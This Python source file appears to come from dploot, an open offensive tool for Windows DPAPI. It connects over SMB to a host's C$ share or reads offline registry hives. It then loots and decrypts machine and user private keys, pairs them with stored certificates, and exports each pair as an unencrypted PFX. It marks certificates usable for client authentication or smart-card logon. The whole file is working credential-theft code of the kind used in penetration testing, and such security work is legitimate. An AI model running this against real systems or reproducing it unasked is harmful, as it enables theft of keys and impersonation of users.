import hashlib
import logging
import ntpath
import os
from typing import Any, Dict, List, Tuple
from dataclasses import dataclass

from impacket.dcerpc.v5 import rrp
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.winregistry import Registry

from Cryptodome.PublicKey import RSA
from cryptography import x509
from cryptography.hazmat._oid import ExtensionOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    pkcs12,
    PublicFormat,
    load_der_private_key,
)
from pyasn1.codec.der import decoder
from pyasn1.type.char import UTF8String

from dploot.lib.crypto import CERTBLOB
from dploot.lib.dpapi import decrypt_privatekey, find_masterkey_for_privatekey_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_certificate_guid
from dploot.triage.masterkeys import Masterkey

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")


@dataclass
class Certificate:
    winuser: str
    cert: x509.Certificate
    pkey: PrivateKeyTypes
    pfx: bytes
    username: str
    filename: str
    clientauth: bool

    def dump(self) -> None:
        print("Issuer:\t\t\t%s" % str(self.cert.issuer.rfc4514_string()))
        print("Subject:\t\t%s" % str(self.cert.subject.rfc4514_string()))
        print("Valid Date:\t\t%s" % self.cert.not_valid_before)
        print("Expiry Date:\t\t%s" % self.cert.not_valid_after)
        print("Extended Key Usage:")
        for i in self.cert.extensions.get_extension_for_oid(
            oid=ExtensionOID.EXTENDED_KEY_USAGE
        ).value:
            print(f"\t{i._name} ({i.dotted_string})")

        if self.clientauth:
            print("\t[!] Certificate is used for client auth!")

        print()
        print(self.cert.public_bytes(Encoding.PEM).decode("utf-8"))
        print()


class CertificatesTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    system_capi_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\RSA",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    system_cng_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\Keys",
        "ProgramData\\Microsoft\\Crypto\\SystemKeys",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    user_capi_keys_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    user_cng_keys_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    user_mycertificates_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates"
    ]
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_certificate_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_certificate_callback = per_certificate_callback

    def triage_system_certificates(self) -> List[Certificate]:
        logging.getLogger("impacket").disabled = True
        if self.conn.local_session:
            self.conn.enable_localops(
                os.path.join(self.target.local_root, r"Windows/System32/config/SYSTEM")
            )
        else:
            self.conn.enable_remoteops()
        certificates = []
        pkeys = self.loot_privatekeys()
        certs = self.loot_system_certificates()
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(
                certs=certs, private_keys=pkeys, winuser="SYSTEM"
            )
        return certificates

    def loot_system_certificates(self) -> Dict[str, x509.Certificate]:
        my_certificates_key = (
            "SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates"
        )
        certificate_keys = []
        certificates = {}
        if self.conn.local_session:
            # open hive
            reg_file_path = os.path.join(
                self.target.local_root, r"Windows/System32/config/SOFTWARE"
            )
            reg = Registry(reg_file_path, isRemote=False)

            # open key
            key_path = my_certificates_key[8:]
            parentKey = reg.findKey(key_path)
            if parentKey is None:
                logging.error(f"Key {key_path} not found in {reg_file_path}")
                return certificates
            # for each certificate subkey (such as Microsoft\SystemCertificates\MY\Certificates\3FD2...)
            for certificate_key in reg.enumKey(parentKey):
                # get 'Blob' value
                (_, certblob_bytes) = reg.getValue(
                    ntpath.join(key_path, certificate_key, "Blob")
                )
                logging.debug(
                    f"Found Certificates Blob: \\\\{self.target.address}\\{ntpath.join(my_certificates_key, certificate_key)}"
                )
                certblob = CERTBLOB(certblob_bytes)
                if certblob.der is None:
                    continue

                # store in certificates dict
                cert = self.der_to_cert(certblob.der)
                certificates[certificate_key] = cert
            reg.close()
        else:
            ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            ans = rrp.hBaseRegOpenKey(
                self.conn.remote_ops._RemoteOperations__rrp,
                regHandle,
                my_certificates_key,
                samDesired=rrp.KEY_ENUMERATE_SUB_KEYS,
            )
            keyHandle = ans["phkResult"]
            i = 0
            while True:
                try:
                    enum_ans = rrp.hBaseRegEnumKey(
                        self.conn.remote_ops._RemoteOperations__rrp, keyHandle, i
                    )
                    certificate_keys.append(enum_ans["lpNameOut"][:-1])
                    i += 1
                except rrp.DCERPCSessionError as e:
                    if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                        break
                except Exception as e:
                    import traceback

                    traceback.print_exc()
                    logging.error(str(e))
            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)

            for certificate_key in certificate_keys:
                try:
                    regKey = my_certificates_key + "\\" + certificate_key
                    ans = rrp.hBaseRegOpenKey(
                        self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey
                    )
                    keyHandle = ans["phkResult"]
                    _, certblob_bytes = rrp.hBaseRegQueryValue(
                        self.conn.remote_ops._RemoteOperations__rrp, keyHandle, "Blob"
                    )
                    logging.debug(
                        f"Found Certificates Blob: \\\\{self.target.address}\\{regKey}"
                    )
                    certblob = CERTBLOB(certblob_bytes)
                    if certblob.der is not None:
                        cert = self.der_to_cert(certblob.der)
                        certificates[certificate_key] = cert
                    rrp.hBaseRegCloseKey(
                        self.conn.remote_ops._RemoteOperations__rrp, keyHandle
                    )
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                        logging.debug(str(e))
        return certificates

    def triage_certificates(self) -> List[Certificate]:
        certificates = []
        for user in self.users:
            try:
                certificates += self.triage_certificates_for_user(user=user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return certificates

    def triage_certificates_for_user(self, user: str) -> List[Certificate]:
        certificates = []
        pkeys = self.loot_privatekeys(
            privatekeys_paths=[elem % user for elem in self.user_capi_keys_generic_path]
        )
        certs = self.loot_certificates(
            certificates_paths=[
                elem % user for elem in self.user_mycertificates_generic_path
            ]
        )
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(
                certs=certs, private_keys=pkeys, winuser=user
            )
        return certificates

    def loot_privatekeys(
        self, privatekeys_paths: List[str] = system_capi_keys_generic_path
    ) -> Dict[str, Tuple[str, RSA.RsaKey]]:
        pkeys = {}
        pkeys_dirs = self.conn.listDirs(self.share, privatekeys_paths)
        for pkeys_path, pkeys_dir in pkeys_dirs.items():
            if pkeys_dir is not None:
                for d in pkeys_dir:
                    if (
                        d not in self.false_positive
                        and d.is_directory() > 0
                        and (
                            d.get_longname()[:2] == "S-"
                            or d.get_longname() == "MachineKeys"
                        )
                    ):
                        sid = d.get_longname()
                        pkeys_sid_path = ntpath.join(pkeys_path, sid)
                        pkeys_sid_dir = self.conn.remote_list_dir(
                            self.share, path=pkeys_sid_path
                        )
                        for file in pkeys_sid_dir:
                            if file.is_directory() == 0 and is_certificate_guid(
                                file.get_longname()
                            ):
                                pkey_guid = file.get_longname()
                                filepath = ntpath.join(pkeys_sid_path, pkey_guid)
                                logging.debug(
                                    f"Found PrivateKey Blob: \\\\{self.target.address}\\{self.share}\\{filepath}"
                                )
                                pkey_bytes = self.conn.readFile(self.share, filepath, looted_files=self.looted_files)
                                if (
                                    pkey_bytes is not None
                                    and self.masterkeys is not None
                                ):
                                    try:
                                        masterkey = find_masterkey_for_privatekey_blob(
                                            pkey_bytes, masterkeys=self.masterkeys
                                        )
                                        if masterkey is not None:
                                            pkey = decrypt_privatekey(
                                                privatekey_bytes=pkey_bytes,
                                                masterkey=masterkey,
                                            )
                                            pkeys[
                                                hashlib.md5(
                                                    pkey.public_key().export_key("DER")
                                                ).hexdigest()
                                            ] = (pkey_guid, pkey)
                                    except Exception as e:
                                        logging.debug(
                                            f"Exception encountered in {__name__}: {e}."
                                        )
        return pkeys

    def loot_certificates(
        self, certificates_paths: List[str]
    ) -> Dict[str, x509.Certificate]:
        certificates = {}
        certificates_dir = self.conn.listDirs(self.share, certificates_paths)
        for cert_dir_path, cert_dir in certificates_dir.items():
            if cert_dir is not None:
                for cert in cert_dir:
                    if cert not in self.false_positive and cert.is_directory() == 0:
                        try:
                            certname = cert.get_longname()
                            certpath = ntpath.join(cert_dir_path, certname)
                            logging.debug(
                                f"Found Certificates Blob: \\\\{self.target.address}\\{self.share}\\{certpath}"
                            )
                            certbytes = self.conn.readFile(self.share, certpath, looted_files=self.looted_files)
                            certblob = CERTBLOB(certbytes)
                            if certblob.der is not None:
                                cert = self.der_to_cert(certblob.der)
                                certificates[certname] = cert
                        except Exception:
                            pass
        return certificates

    def correlate_certificates_and_privatekeys(
        self,
        certs: Dict[str, x509.Certificate],
        private_keys: Dict[str, Tuple[str, RSA.RsaKey]],
        winuser: str,
    ) -> List[Certificate]:
        certificates = []
        for name, cert in certs.items():
            if (
                hashlib.md5(
                    cert.public_key().public_bytes(
                        Encoding.DER, PublicFormat.SubjectPublicKeyInfo
                    )
                ).hexdigest()
                in private_keys
            ):
                # Matching public and private key
                pkey = private_keys[
                    hashlib.md5(
                        cert.public_key().public_bytes(
                            Encoding.DER, PublicFormat.SubjectPublicKeyInfo
                        )
                    ).hexdigest()
                ]
                logging.debug(
                    f"Found match between {name} certificate and {pkey[0]} private key !"
                )
                key = load_der_private_key(pkey[1].export_key("DER"), password=None)
                pfx = self.create_pfx(key=key, cert=cert)
                # TODO CAN BE NULL self.get_id_from_certificate(certificate=cert)[1]
                username = self.get_id_from_certificate(certificate=cert)[1].replace(
                    "@", "_"
                )
                clientauth = False
                for i in cert.extensions.get_extension_for_oid(
                    oid=ExtensionOID.EXTENDED_KEY_USAGE
                ).value:
                    if i.dotted_string in [
                        "1.3.6.1.5.5.7.3.2",  # Client Authentication
                        "1.3.6.1.5.2.3.4",  # PKINIT Client Authentication
                        "1.3.6.1.4.1.311.20.2.2",  # Smart Card Logon
                        "2.5.29.37.0",  # Any Purpose
                    ]:
                        clientauth = True
                        break
                cert_object = Certificate(
                    winuser=winuser,
                    cert=cert,
                    pkey=key,
                    pfx=pfx,
                    username=username,
                    filename=name,
                    clientauth=clientauth,
                )
                certificates.append(cert_object)
                if self.per_certificate_callback is not None:
                    self.per_certificate_callback(cert_object)
        return certificates

    def der_to_cert(self, certificate: bytes) -> x509.Certificate:
        return x509.load_der_x509_certificate(certificate)

    def create_pfx(self, key: rsa.RSAPrivateKey, cert: x509.Certificate) -> bytes:
        return pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )

    def get_id_from_certificate(self, certificate: x509.Certificate) -> Tuple[str, str]:
        try:
            san = certificate.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )

            for name in san.value.get_values_for_type(x509.OtherName):
                if name.type_id == PRINCIPAL_NAME:
                    return (
                        "UPN",
                        decoder.decode(name.value, asn1Spec=UTF8String)[0].decode(),
                    )

            for name in san.value.get_values_for_type(x509.DNSName):
                return "DNS Host Name", name
        except Exception:
            pass

        return "", "SAN not found"

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
